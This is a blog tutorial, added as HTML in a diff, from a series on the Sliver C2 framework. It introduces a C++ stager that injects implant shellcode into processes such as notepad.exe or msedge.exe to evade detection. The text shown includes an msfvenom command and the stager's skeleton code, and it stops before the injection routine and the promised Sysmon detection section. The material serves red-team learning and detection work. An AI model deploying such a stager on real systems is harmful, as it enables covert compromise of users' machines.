@@ -1,0 +1,1501 @@
+<html lang="en-US"><head>
+    <meta name="generator" content="Hugo 0.92.2">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (07) - Stagers: Process Injection | text/plain</title>
+    <meta name="description" content="A C++ stager for Sliver C2 implants that uses process injection to execute an implant
+in existing processes. Apart from the stager itself I'll also show how it might be 
+detected by Sysmon logging.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, stagers, process injection, sysmon">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (07) - Stagers: Process Injection">
+<meta property="og:description" content="A C++ stager for Sliver C2 implants that uses process injection to execute an implant
+in existing processes. Apart from the stager itself I'll also show how it might be 
+detected by Sysmon logging.
+">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_06_stagers_process_injection/"><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2022-10-09T00:00:00+00:00">
+<meta property="article:modified_time" content="2022-10-09T00:00:00+00:00">
+
+
+    <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://dominicbreuker.com/img/avatar.png">
+
+<meta name="twitter:title" content="Learning Sliver C2 (07) - Stagers: Process Injection">
+<meta name="twitter:description" content="A C++ stager for Sliver C2 implants that uses process injection to execute an implant
+in existing processes. Apart from the stager itself I'll also show how it might be 
+detected by Sysmon logging.
+">
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_06_stagers_process_injection/">
+    
+    
+    <link rel="icon" sizes="any" href="/img/favicon.ico">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+input:invalid {
+  border-bottom: 2px solid #f44336 !important;
+}
+
+input:valid {
+  border-bottom: 2px solid #ccc;
+}
+
+</style>
+
+    
+    
+      <script async="" src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async="" src="/js/bpgdec8a.js"></script>
+      <script async="" src="/js/bpgdec8.js"></script>
+      <script async="" src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope="" itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/encoders/"><span itemprop="name">Encoders</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope="" itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (07) - Stagers: Process Injection">
+<meta itemprop="description" content="A C++ stager for Sliver C2 implants that uses process injection to execute an implant
+in existing processes. Apart from the stager itself I'll also show how it might be 
+detected by Sysmon logging.
+"><meta itemprop="datePublished" content="2022-10-09T00:00:00+00:00">
+<meta itemprop="dateModified" content="2022-10-09T00:00:00+00:00">
+<meta itemprop="wordCount" content="4619"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png">
+<meta itemprop="keywords" content="c2,sliver,tutorial,stagers,process injection,sysmon,">
+    <script async="" src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">"_"//*@$ _"^#:' &lt;] ]`#' ~ %.==@#+$ |%'#-;. ~([}&lt;;:on</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14"></circle>
+  <path d="M16 8 L16 16 20 20"></path>
+</svg>
+<span>22 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"></path>
+</svg>
+
+  Published: <time datetime="2022-10-09T00:00:00+00:00">9 Oct, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">A C++ stager for Sliver C2 implants that uses process injection to execute an implant
+in existing processes. Apart from the stager itself I'll also show how it might be 
+detected by Sysmon logging.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#stager-with-process-injection">Stager with Process Injection</a>
+      <ul>
+        <li><a href="#developing-process-injection">Developing Process Injection</a></li>
+        <li><a href="#finalizing-the-stager">Finalizing the Stager</a></li>
+      </ul>
+    </li>
+    <li><a href="#defense">Defense</a>
+      <ul>
+        <li><a href="#protection">Protection</a></li>
+        <li><a href="#detection">Detection</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (v1.5.16).
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/#series-overview">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>The <a href="../../post/learning_sliver_c2_06_stagers">previous post</a>
+introduced basic custom stagers which run a Sliver implant within the stager process.
+Real malware however often injects a malicious payload into already existing processes for various reasons.
+The goal may be to bypass protection mechanisms or to avoid detection.
+For example, a browser process might be allowed to connect to the internet while other processes get blocked,
+or even if all processes are allowed, it may look less suspicious if it’s a browser doing that.</p>
+<p>With this post, I want to introduce process injection to illustrate how one process
+can access another to run arbitrary code in there. Process injections means you can have a custom program
+like “stager.exe” inject code into another process like “explorer.exe”, where the code will run
+within some thread. “stager.exe” can terminate while the code keeps running. A person looking
+at the list of running processes in the task manager will not see anything out of the ordinary.</p>
+<p>Process injection is a very broad topic and tons of variations exist. Thus, I will leave it
+to the professionals to give
+<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">an overview (from 2019)</a>.
+In this post we’ll get by with just the “classic” method.
+It uses three functions: <code>VirtualAllocEx</code> to allocate new memory,
+<code>WriteProcessMemory</code> to write the code into it and finally
+<code>CreateRemoteThread</code> to run the code in a new thread.
+You can find examples of this technique all over the internet.
+With this post, the internet now has one more.</p>
+<p>This post will not just cover the how-to of process injection but also
+go into the defensive side of things.
+After all, the goal is to catch the people doing this stuff.
+Accordingly, I’ll show how <a href="https://learn.microsoft.com/de-de/sysinternals/downloads/sysmon">Sysmon</a>,
+a free host-based monitoring solution, can be leveraged to detect the stager we write
+(because Defender does not).</p>
+<p>Unlike the previous post, I’ll stick to C++ this time for stager development.
+Since implementations in other languages like C# and PowerShell would be very similar,
+it’s straightforward to translate if needed.
+However, my personal feeling so far is that it’s best to just get used to C++.
+Low-level code is best written in low-level languages.</p>
+<h2 id="preparations">Preparations</h2>
+<p>You can follow along most of the process injection development with just a Windows
+machine and Visual Studio (for C++ development). Whenever I show how the stager is
+used together with Sliver C2, I do so using my personal local lab environment. Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it. Details don’t matter too much here.
+What you need to know is this. We have</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.32)</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<h2 id="stager-with-process-injection">Stager with Process Injection</h2>
+<p>The main focus of this post is process injection.
+To get the code developed, it’s easier to develop it locally first
+without interfacing with the Sliver C2 server.
+Therefore there will be two subsections below.
+The first is about process injection development (and thus does not rely on a C2 server),
+the second shows how to use it with Sliver C2.</p>
+<h3 id="developing-process-injection">Developing Process Injection</h3>
+<p>To develop process injection without the C2 server, we need a development payload that we can inject.
+You can create one using <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>,
+the payload generation tool from Metasploit.
+Use this command: <code>msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread</code>.
+On execution, this payload pops up a message box saying “Hi from MSF”, so it’s easy to see if things worked or not.</p>
+<p>The arguments above make <code>msfvenom</code> create a 64bit payload that terminates the thread when the payload terminates.
+Terminating the thread is fine since we will run the payload in it’s own thread.
+If you use the default option, which is <code>process</code>, it will kill the entire process you injected into.
+This is usually not what you want.</p>
+<p>The main structure of the stager is similar to that shown in the <a href="../../post/learning_sliver_c2_06_stagers">previous post</a>.
+Below you can find the <code>main</code> function, which shows the three functions we have to implement.
+<code>GetTargetPID</code> has to give us the process ID (PID) to inject into.
+<code>GetShellcode</code> is responsible for loading the payload into a <code>Shellcode</code> struct.
+Finally, <code>Inject</code> is what injects the shellcode into the process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">"Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Let’s look at these three functions in order.
+To find a good PID we need to know what we are looking for.
+In this example, we want to be able to specify a list of candidate process names
+and the function should give us the first PID of a process that matches them.
+For example, if the list contains “notepad.exe” and “msedge.exe”,
+we should get the first PID of a notepad process, or if that does not exist,
+it should return the first PID of an Edge process.
+If no PID is found at all, the result should be 0
+(technically PID 0 exists and since it should always the Windows Idle Process there
+is no need to ask <code>GetTargetPID</code> about it so accordingly, using 0 for errors is fine).</p>
+<p>The function can be written as seen below.
+<code>GetTargetPID</code> defines the list of process names,
+then uses <code>GetFirstPIDProclist</code> to get a PID.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"notepad.exe"</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"msedge.exe"</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+</code></pre></div><p>The logic for <code>GetFirstPIDProclist</code> is simple too.
+Once again, I delegate the hard part to a helper function <code>GetFirstPIDProcname</code>,
+which shall return the PID of the first function matching a process name.
+For now, we just iterate over all candidate names and return a PID for the first hit:</p>
